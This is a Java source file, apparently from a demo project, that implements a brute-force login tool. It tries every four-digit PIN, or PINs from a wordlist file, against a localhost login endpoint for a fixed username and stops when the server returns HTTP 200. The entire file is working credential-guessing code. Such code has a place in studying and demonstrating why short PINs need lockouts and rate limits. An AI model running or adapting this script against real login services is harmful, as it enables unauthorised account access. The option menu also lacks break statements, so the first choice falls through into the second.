package com.example.demo.client;

import java.io.BufferedReader;
import java.io.FileReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;
import java.util.Scanner;

public class BruteForce {

    String api = "http://localhost:8081/loginforce";

    String filepath = "server/src/main/resources/pincodes.txt";
    String userAdmin = "apa";
    int iterations = 9999;

    private void Program(){
        Scanner scan = new Scanner(System.in);
        System.out.println("How would you like to brute force?");
        System.out.println("1. iteration");
        System.out.println("2. logic thru file");
        switch (scan.nextInt()){
            case 1: IterationBruteProgram();
            case 2: logicBruteForce();
        }
    }

    private void IterationBruteProgram(){
        long start = System.nanoTime();
        for (int password = 0; password < iterations; password++) {
            long start2 = System.nanoTime();

            String formatPassword;

            if(password <= 9){
                formatPassword = "000" + password;
            } else if(password <= 99){
                formatPassword = "00" + password;
            } else if(password <= 999){
                formatPassword = "0" + password;
            } else {
                formatPassword = String.valueOf(password);
            }
            System.out.println("Attempt: " + formatPassword);

            if(apiRequest(userAdmin, formatPassword)){
                System.out.println("Password: " + formatPassword);
                break;
            }
            long end2 = System.nanoTime();
            long total = end2 - start2;
            System.out.println("Total time: " + total / 1_000_000_000 + " seconds per attempt");
        }
        long end = System.nanoTime();
        long total = end - start;
        System.out.println("Total time: " + total / 1_000_000_000 + " seconds");
    }

    private void logicBruteForce(){
        List<String> passwords = fileReader(filepath);
        long start = System.nanoTime();
        for (int i = 0; i < passwords.size(); i++) {
            String formatPassword = String.valueOf(passwords.get(i));
            System.out.println("Attempt: " + passwords.get(i));

            if(apiRequest(userAdmin, formatPassword)){
                System.out.println("Password: " + passwords.get(i));
                break;
            }
        }
        long end = System.nanoTime();
        long total = end - start;
        System.out.println("Total time: " + total / 1_000_000_000 + " seconds");
    }

    private boolean apiRequest(String user, String password){
        try {
            HttpURLConnection con = (HttpURLConnection) new URL(api).openConnection();
            con.setRequestMethod("POST");
            con.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            con.setDoOutput(true);

            String formData = "username=" + user + "&password=" + password;

            try(OutputStream os = con.getOutputStream()) {
                byte[] input = formData.getBytes(StandardCharsets.UTF_8);
                os.write(input, 0, input.length);
            }
            return con.getResponseCode() == 200;
        }catch (Exception e){
            e.printStackTrace();
        }
        return false;
    }

    private List<String> fileReader(String filepath){
        List<String> passwords = new ArrayList<>();
        try(BufferedReader reader = new BufferedReader(new FileReader(filepath))){

            String line;
            while((line = reader.readLine()) != null){
                String[] parts = line.split(",");
                if(parts.length >= 1){
                    passwords.add(parts[0].trim());
                }
            }

        } catch (Exception e){
            e.printStackTrace();
        }
        return passwords;
    }


    public static void main(String[] args) {
        BruteForce bruteForce = new BruteForce();
        bruteForce.Program();
    }
}